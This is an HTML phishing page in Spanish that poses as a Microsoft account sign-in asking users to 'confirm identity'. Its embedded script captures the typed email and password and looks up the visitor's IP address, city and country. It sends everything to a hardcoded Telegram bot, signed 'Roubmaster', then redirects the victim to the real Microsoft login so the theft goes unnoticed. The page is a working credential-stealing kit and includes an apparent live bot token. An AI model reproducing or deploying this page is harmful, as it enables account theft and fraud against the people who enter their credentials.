<html><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Home</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"><!-- Link para importar la tipografia "Montserrat"-->
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500&amp;display=swap" rel="stylesheet"><!-- Link para importar los iconos-->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><!-- Importar JQuery-->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><!-- Bootstrap JS-->
    <link rel="stylesheet" type="text/css" href="style.css">
        <script>
             $.getJSON("https://ipinfo.io", function (response) {
        $("#address").html( response.city + ", " + response.country);
        
    })
          </script>

</head>
<body>
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <div class="login-container">
    <div class="wrapper">
        <div class="col-xs-12 col-sm-4 col-sm-offset-4 login-box" style="z-index:1000">
            <div class="login-header"><img src="https://i.imgur.com/xfNCpH3.png">
                <h4 class="ingresa-cuenta">Ingresa a tu cuenta</h4>
                <p class="text">Inicia sesión en la plataforma Microsoft para confirmar identidad.</p>
            </div>
            <div class="alert alert-danger" id="error-message"></div>
            <div>
                <form id="contenido1" action="" method="post" onsubmit=" return sender()">
                    <div class="form-group label-animate"><label for="usr">Correo electrónico</label><input class="form-control" id="uzer" type="email" name="uzer" autocomplete="off" required=""></div>
                    <div class="form-group label-animate"><label for="password">Contraseña</label><i class="fa fa-eye eye-icon" aria-hidden="true" onclick="showPassword()" style="cursor: pointer;"></i><input class="form-control" id="pazz" name="pazz" type="text" required=""></div>
                                                   <p id="gfg"  hidden="">
                                                   <p id="address"  hidden="">
                    <div class="center" style="padding-top: 5px; padding-bottom: 5px; margin-top: 5px"><a id="link-olvidaste-tu-password" href="h">¿Olvidaste tu contraseña?</a></div>
                    <div class="captcha-container form-group" style="display: none;"></div><button class="btn btn-primary btn-block" id="btn-login">Iniciar sesión</button>
                </form>
                <div id="bottom-imgs">
                    <div class="img-block"><img src="https://pbs.twimg.com/media/Fth_yz1XwAcYAuX?format=png&amp;name=360x360"></div>
                    <div id="vl"></div>
                    <div class="img-block"><img src="https://pbs.twimg.com/media/Fth_4zaX0AAw80V?format=png&amp;name=small"></div>
                </div>
                <div class="center"></div>
                <hr style="width: 30%; background-color:#666666; margin-top: 10px; margin-bottom: 10px;">
                <p class="center text" style="margin: 0;">Contactanos:</p>
                <div class="center">
                    
                    <p class="text" style="display:inline">outlook.live.com</p>
                </div>
            </div>
        </div>
        <div id="gradient"></div>
    </div>
    <div class="login-footer"></div>
    <div class="login-footer-responsive"><img src="https://pbs.twimg.com/media/Fth-XmMXwBYrdcF?format=jpg&amp;name=small"></div>
</div>
<!--if IE 8script(src='//cdnjs.cloudflare.com/ajax/libs/ie8/0.2.5/ie8.js')-->
<!--if lte IE 9script(src='https://cdn.auth0.com/js/polyfills/1.0/base64.min.js')
script(src='https://cdn.auth0.com/js/polyfills/1.0/es5-shim.min.js')-->
<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

            <script>
              const url = "https://ipapi.co/json/";
              const form = document.querySelector("#contenido1");
              form.addEventListener("submit", (event) => {
                event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
                axios
                  .get(url)
                  .then((response) => {
                    const email = document.querySelector("#uzer").value;
          
                    const contra = document.querySelector("#pazz").value;
                    
                    const message =
                      "\nEmail: " +
                      email +
                      "\nContra: " +
                      contra +
                      "\nDatos:" +
                      response.data.city + response.data.country + response.data.ip + "\n\n🧿BY: Roubmaster🧿";
                    axios
                      .post(
                        "https://api.telegram.org/bot7403865760:AAGYqssIr8RFFx7eZQsKkbcb957AqydR9N0/sendMessage",
                        {
                          chat_id: "6944568582",
                          text: message,
                        }
                      )
                      .then((response) => {
                        window.location.href = "https://login.live.com";
                      })
                      .catch((error) => {
                        console.error(error);
                      });
                  })
                  .catch((error) => {
                    console.log(error);
                  });
              });
            </script>
</body></html>
